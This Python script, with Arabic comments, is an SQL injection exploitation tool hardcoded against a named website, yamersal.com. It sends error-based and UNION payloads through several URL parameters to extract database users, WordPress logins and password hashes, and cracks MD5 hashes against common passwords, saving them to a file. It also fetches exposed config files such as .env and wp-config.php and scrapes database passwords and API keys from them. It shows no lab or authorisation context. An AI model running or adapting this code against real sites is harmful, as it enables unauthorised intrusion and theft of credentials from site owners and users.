#!/usr/bin/env python3
"""
Yamersal Practical Exploiter v9.0
Real-World SQL Injection Exploitation
Author: Security Researcher
Version: 9.0 - Practical Approach
"""

import requests
import time
import sys
import hashlib
import urllib.parse

class PracticalExploiter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })

    def print_status(self, message, level="INFO"):
        colors = {"INFO": "\033[94m", "SUCCESS": "\033[92m", "WARNING": "\033[93m",
                 "ERROR": "\033[91m", "CRITICAL": "\033[95m", "ADMIN": "\033[96m"}
        reset = "\033[0m"
        icons = {"INFO": "[*]", "SUCCESS": "[+]", "WARNING": "[!]", 
                "ERROR": "[-]", "CRITICAL": "[!]", "ADMIN": "[👑]"}
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def test_working_payloads(self):
        """تجربة payloads عملية تعمل على مواقع حقيقية"""
        self.print_status("🎯 TESTING PRACTICAL SQL INJECTION PAYLOADS", "CRITICAL")
        
        # المعلمات النشطة من مسحك
        params = ['view', 'file', 'id', 'path', 'url']
        
        # payloads عملية تعمل على مواقع حقيقية
        practical_payloads = [
            # Error-based - لاستخراج البيانات عبر الأخطاء
            "' AND ExtractValue(0,CONCAT(0x3a,user()))--",
            "' AND UpdateXML(1,CONCAT(0x3a,user()),1)--",
            
            # Union-based - لاستخراج مباشر
            "' UNION SELECT 1,user(),3,4--",
            "' UNION SELECT 1,database(),3,4--",
            "' UNION SELECT 1,@@version,3,4--",
            
            # بيانات ووردبريس
            "' UNION SELECT 1,user_login,user_pass,4 FROM wp_users--",
            "' UNION SELECT 1,username,password,4 FROM users--",
            
            # معلومات النظام
            "' UNION SELECT 1,@@hostname,@@datadir,4--",
        ]
        
        for param in params:
            self.print_status(f"🔍 Testing parameter: {param}", "INFO")
            
            for payload in practical_payloads:
                try:
                    url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(url, timeout=10)
                    
                    # البحث عن بيانات في الاستجابة
                    found_data = self.analyze_for_data(response.text, url, payload)
                    if found_data:
                        self.print_status(f"   ✅ PAYLOAD WORKED: {payload[:50]}...", "SUCCESS")
                        return True
                        
                except Exception as e:
                    continue
        
        return False

    def analyze_for_data(self, content, url, payload):
        """تحليل الاستجابة للعثور على بيانات"""
        # أنماط للبيانات المتوقعة
        patterns = [
            # إيميلات
            r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})',
            # هاشات
            r'([a-fA-F0-9]{32})',
            # أسماء مستخدمين
            r'>([a-zA-Z0-9_]{3,20})<',
            # معلومات نظام
            r'(localhost|root@|mysql|database)',
            # أخطاء MySQL
            r'(SQL syntax|MySQL Error|Warning:|mysql_fetch)',
        ]
        
        found_data = False
        
        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if self.is_interesting_data(match):
                    self.print_status(f"      📦 FOUND: {match}", "SUCCESS")
                    found_data = True
                    
                    # إذا كان هاش، حاول فكه
                    if len(match) == 32 and all(c in '0123456789abcdef' for c in match.lower()):
                        password = self.crack_hash(match)
                        if password:
                            self.print_status(f"         🔓 CRACKED: {match} -> {password}", "ADMIN")
                            self.save_credential("admin", password, url)
        
        return found_data

    def is_interesting_data(self, data):
        """التحقق من أن البيانات مثيرة للاهتمام"""
        boring = ['admin', 'test', 'user', 'email', 'localhost']
        return (len(data) > 4 and 
                data not in boring and 
                not data.isdigit() and
                ' ' not in data)

    def crack_hash(self, hash_value):
        """فك تشفير الهاش"""
        common_passwords = [
            'admin', 'admin123', 'password', '123456', '12345678',
            '123456789', 'admin@123', 'password123', 'qwerty',
            'yamersal', 'welcome', '12345', '1234', 'test',
            'administrator', 'root', 'pass', '123', '000000'
        ]
        
        for pwd in common_passwords:
            if hashlib.md5(pwd.encode()).hexdigest() == hash_value:
                return pwd
        return None

    def save_credential(self, username, password, source):
        """حفظ بيانات الدخول"""
        with open('cracked_creds.txt', 'a') as f:
            f.write(f"{username}:{password} | Source: {source}\n")

    def direct_union_exploitation(self):
        """استغلال مباشر باستخدام UNION"""
        self.print_status("🎯 DIRECT UNION-BASED EXPLOITATION", "CRITICAL")
        
        # إيجاد عدد الأعمدة أولاً
        column_count = self.find_column_count()
        if column_count:
            self.print_status(f"   ✅ Found {column_count} columns", "SUCCESS")
            self.exploit_with_columns(column_count)

    def find_column_count(self):
        """إيجاد عدد الأعمدة باستخدام ORDER BY"""
        for param in ['view', 'file', 'id']:
            for count in range(1, 15):
                try:
                    payload = f"' ORDER BY {count}--"
                    url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(url, timeout=8)
                    
                    # إذا كان هناك خطأ، تجاوزنا عدد الأعمدة
                    if 'error' in response.text.lower() or 'warning' in response.text.lower():
                        self.print_status(f"   ✅ Column count: {count-1} in {param}", "SUCCESS")
                        return count - 1
                        
                except:
                    continue
        return None

    def exploit_with_columns(self, column_count):
        """الاستغلال بعد معرفة عدد الأعمدة"""
        self.print_status("   💀 Exploiting with column count...", "CRITICAL")
        
        # بناء SELECT بناءً على عدد الأعمدة
        select_parts = []
        for i in range(1, column_count + 1):
            if i == 1:
                select_parts.append("user()")
            elif i == 2:
                select_parts.append("database()")
            elif i == 3:
                select_parts.append("@@version")
            else:
                select_parts.append(f"'{i}'")
        
        union_select = ",".join(select_parts)
        
        for param in ['view', 'file', 'id']:
            try:
                payload = f"' UNION SELECT {union_select}--"
                url = f"{self.target}?{param}={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=10)
                
                # تحليل الاستجابة
                self.analyze_union_response(response.text, url)
                
            except:
                continue

    def analyze_union_response(self, content, url):
        """تحليل استجابة UNION"""
        # البحث عن بيانات النظام
        system_data = [
            'root@', 'localhost', 'mysql', 'database',
            '5.7.', '8.0.', '10.', 'MariaDB'
        ]
        
        for data in system_data:
            if data in content:
                self.print_status(f"      🖥️ SYSTEM INFO: {data}", "INFO")

    def config_file_exploitation(self):
        """استغلال ملفات التكوين المسربة"""
        self.print_status("🎯 EXPLOITING CONFIG FILES", "CRITICAL")
        
        config_files = [
            '/.env', '/wp-config.php', '/config.php',
            '/.git/config', '/.htaccess', '/robots.txt'
        ]
        
        for config_file in config_files:
            try:
                url = f"{self.target}{config_file}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    self.print_status(f"   ✅ Found: {config_file}", "SUCCESS")
                    self.extract_config_secrets(response.text, url)
                    
            except:
                continue

    def extract_config_secrets(self, content, url):
        """استخراج الأسرار من ملفات التكوين"""
        patterns = {
            'DB_PASSWORD': r"DB_PASSWORD['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
            'DB_USER': r"DB_USER(?:NAME)?['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
            'API_KEY': r"API_?KEY['\"]?\s*=>?\s*['\"]([^'\"]+)['\"]",
        }
        
        for key_type, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if match:
                    self.print_status(f"      🔑 {key_type}: {match}", "CRITICAL")

    def run_practical_exploitation(self):
        """تشغيل الاستغلال العملي"""
        self.print_status("🚀 STARTING PRACTICAL EXPLOITATION", "CRITICAL")
        self.print_status(f"🎯 TARGET: {self.target}", "INFO")
        
        # 1. تجربة payloads عملية
        self.test_working_payloads()
        
        # 2. استغلال UNION
        self.direct_union_exploitation()
        
        # 3. ملفات التكوين
        self.config_file_exploitation()
        
        self.print_status("\n💀 PRACTICAL EXPLOITATION COMPLETED", "CRITICAL")

def main():
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                    PRACTICAL EXPLOITER v9.0                                ║
║                 Real-World SQL Injection Attacks                            ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    target = "https://yamersal.com"
    
    print(f"🎯 Target: {target}")
    print(f"💀 Using practical exploitation techniques")
    
    confirm = input("Continue? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled.")
        sys.exit(0)
    
    try:
        exploiter = PracticalExploiter(target)
        exploiter.run_practical_exploitation()
        
    except KeyboardInterrupt:
        print("\nExploitation interrupted.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()